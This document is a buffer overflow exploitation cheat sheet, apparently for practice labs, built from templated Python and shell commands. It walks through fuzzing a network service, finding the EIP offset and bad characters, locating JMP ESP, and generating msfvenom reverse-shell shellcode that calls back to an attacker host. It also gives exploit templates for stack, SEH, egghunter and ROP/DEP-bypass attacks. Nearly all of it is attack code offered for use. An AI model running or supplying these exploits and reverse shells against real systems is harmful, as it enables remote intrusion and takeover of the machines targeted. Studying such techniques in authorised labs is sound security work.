# Buffer Overflow

## Fuzzing

```python
#!/usr/bin/python3
import socket, sys

# Simple fuzzer
buffer = "A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{{machine_ip}}', {{port}}))
        s.send(buffer.encode())
        s.close()
        print(f"Sent {len(buffer)} bytes")
        buffer += "A" * 100
    except:
        print(f"Crashed at {len(buffer)} bytes")
        sys.exit(0)
```

## Pattern Creation

```bash
# Metasploit pattern create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {{length}}
msf-pattern_create -l {{length}}

# Pattern offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {{eip_value}}
msf-pattern_offset -q {{eip_value}} -l {{length}}
```

## Finding EIP Offset

```python
#!/usr/bin/python3
import socket

# Send pattern
pattern = "Aa0Aa1Aa2Aa3..."  # Pattern from pattern_create
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{{machine_ip}}', {{port}}))
s.send(pattern.encode())
s.close()

# Check EIP value in debugger
# Use pattern_offset to find exact offset
```

## Controlling EIP

```python
#!/usr/bin/python3
import socket

offset = {{offset}}
eip = b"BBBB"
payload = b"A" * offset + eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{{machine_ip}}', {{port}}))
s.send(payload)
s.close()
```

## Finding Bad Characters

```python
#!/usr/bin/python3
import socket

# All characters except null byte
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

offset = {{offset}}
eip = b"BBBB"
payload = b"A" * offset + eip + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{{machine_ip}}', {{port}}))
s.send(payload)
s.close()

# Check ESP in debugger for truncated/modified characters
```

## Finding JMP ESP

```bash
# Mona (Immunity Debugger)
!mona modules
!mona find -s "\xff\xe4" -m {{module_name}}
!mona jmp -r esp -m {{module_name}}

# Exclude bad characters
!mona jmp -r esp -m {{module_name}} -cpb "\x00\x0a\x0d"

# ROPgadget
ROPgadget --binary {{binary}} --only "jmp|call" | grep esp
```

## Generating Shellcode

```bash
# MSFVenom
msfvenom -p windows/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f c -b "\x00\x0a\x0d"
msfvenom -p linux/x86/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f c -b "\x00"

# With encoder
msfvenom -p windows/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai

# Python format
msfvenom -p windows/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f python -b "\x00\x0a\x0d"
```

## Final Exploit

```python
#!/usr/bin/python3
import socket

# Shellcode from msfvenom
shellcode = (
    b"\xda\xc1\xba\xe4\x11\xd4\x6e\xd9\x74\x24\xf4\x5e\x29\xc9"
    # ... shellcode here ...
)

offset = {{offset}}
eip = b"\x83\x0c\x09\x10"  # JMP ESP address (little endian)
nops = b"\x90" * 16

payload = b"A" * offset + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{{machine_ip}}', {{port}}))
s.send(payload)
s.close()
```

## Stack-Based BOF Template

```python
#!/usr/bin/python3
import socket
import sys

# Configuration
target_ip = "{{machine_ip}}"
target_port = {{port}}

# Exploit components
offset = {{offset}}
jmp_esp = b"\x83\x0c\x09\x10"  # Address in little endian
nops = b"\x90" * 16

# Shellcode (msfvenom)
shellcode = (
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    # ... rest of shellcode ...
)

# Build payload
buffer = b"OVERFLOW "  # Prefix if needed
buffer += b"A" * offset
buffer += jmp_esp
buffer += nops
buffer += shellcode

# Send exploit
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    print(f"[+] Sending payload of {len(buffer)} bytes")
    s.send(buffer)
    s.close()
    print("[+] Payload sent!")
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
```

## SEH Overflow

```python
#!/usr/bin/python3
import socket

# SEH overwrite
offset_to_seh = {{offset}}
nseh = b"\xeb\x06\x90\x90"  # Jump 6 bytes
seh = b"\x83\x0c\x09\x10"   # POP POP RET address
nops = b"\x90" * 16
shellcode = b"..."  # Your shellcode

payload = b"A" * offset_to_seh + nseh + seh + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{{machine_ip}}', {{port}}))
s.send(payload)
s.close()
```

## Egghunter

```python
#!/usr/bin/python3
import socket

# Egghunter shellcode
egghunter = (
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
    b"\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

# Tag for shellcode
tag = b"w00tw00t"

# Main shellcode with tag
shellcode = tag + b"..."  # Your shellcode with tag prepended

offset = {{offset}}
jmp_esp = b"\x83\x0c\x09\x10"
nops = b"\x90" * 16

# First stage (egghunter)
payload1 = b"A" * offset + jmp_esp + nops + egghunter

# Second stage (tagged shellcode in different location)
payload2 = shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{{machine_ip}}', {{port}}))
s.send(payload1)
s.send(payload2)
s.close()
```

## ASLR/DEP Bypass (ROP Chain)

```bash
# Generate ROP chain with mona
!mona rop -m {{module_name}} -cpb "\x00\x0a\x0d"

# ROPgadget
ROPgadget --binary {{binary}} --ropchain
```

```python
#!/usr/bin/python3
import socket
import struct

# ROP gadgets
def p(addr):
    return struct.pack("<I", addr)

# Disable DEP with VirtualProtect
rop_chain = b""
rop_chain += p(0x10015fe7)  # POP EAX ; RET
rop_chain += p(0x90909090)  # Placeholder
rop_chain += p(0x10015fe8)  # XCHG EAX,ESP ; RET
# ... rest of ROP chain ...

offset = {{offset}}
payload = b"A" * offset + rop_chain + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{{machine_ip}}', {{port}}))
s.send(payload)
s.close()
```

## Immunity Debugger Mona Commands

```bash
# Set working folder
!mona config -set workingfolder C:\mona\%p

# Find offset
!mona findmsp -distance {{length}}

# Find bad characters
!mona bytearray -cpb "\x00"
!mona compare -f C:\mona\bytearray.bin -a {{esp_address}}

# Find JMP ESP
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# Find POP POP RET (for SEH)
!mona seh -cpb "\x00\x0a\x0d"

# Generate ROP chain
!mona rop -m {{module_name}} -cpb "\x00\x0a\x0d"

# Check protections
!mona modules
```

## GDB Commands

```bash
# Set breakpoint
break *0x08048484

# Run with arguments
run $(python -c 'print "A"*100')

# Examine registers
info registers
print $eip

# Examine memory
x/100x $esp
x/s 0x08048000

# Find pattern offset
pattern create 500
pattern offset 0x41414141

# Continue execution
continue
c
```

## Common Bad Characters

```
\x00 - Null byte (always bad)
\x0a - Line feed
\x0d - Carriage return
\x20 - Space
\xff - Often bad in HTTP
```

## Shellcode Space Issues

```python
# If not enough space for full shellcode
# Use staged payload or egghunter

# Staged payload
# First stage: small shellcode to download/execute second stage
# Second stage: full reverse shell

# Socket reuse
# Reuse existing socket connection
msfvenom -p windows/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} EXITFUNC=thread PrependMigrate=true PrependMigrateProc=explorer.exe
```